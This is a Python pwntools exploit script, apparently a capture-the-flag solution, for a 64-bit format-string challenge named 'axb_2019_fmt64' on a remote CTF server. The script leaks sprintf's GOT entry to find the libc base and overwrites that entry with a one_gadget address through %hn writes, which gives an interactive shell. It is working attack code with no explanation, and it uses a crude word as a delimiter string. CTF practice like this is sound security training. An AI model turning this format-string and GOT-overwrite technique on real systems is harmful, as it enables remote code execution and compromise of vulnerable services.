from pwn import *
r = remote('node3.buuoj.cn',27250)
elf = ELF('./axb_2019_fmt64')
libc = ELF('/libc-2.23.so')
sprintf_got = elf.got['sprintf']
payload = '%9$sfuck'+p64(sprintf_got)
log.info(hex(sprintf_got))
r.recvuntil(':')
r.sendline(payload)
r.recvuntil('Repeater:')
sprintf_leak = u64(r.recvuntil('fuck',drop=True).ljust(8,'\x00'))
libc_base = sprintf_leak-libc.sym['sprintf']
log.success(hex(libc_base))
one = libc_base+0x45216
log.info(hex(one))
fuck1 = one & 0xffff
fuck2 = (one >> 16) & 0xffff
payload = ''
payload += '%' + str(fuck1 - 9) + 'c%12$hn'
payload += '%' + str(fuck2-fuck1) + 'c%13$hn'
payload = payload.ljust(0x20,'\x00')
payload += p64(sprintf_got) + p64(sprintf_got + 2)

r.recvuntil(':')
r.sendline(payload)

r.interactive()
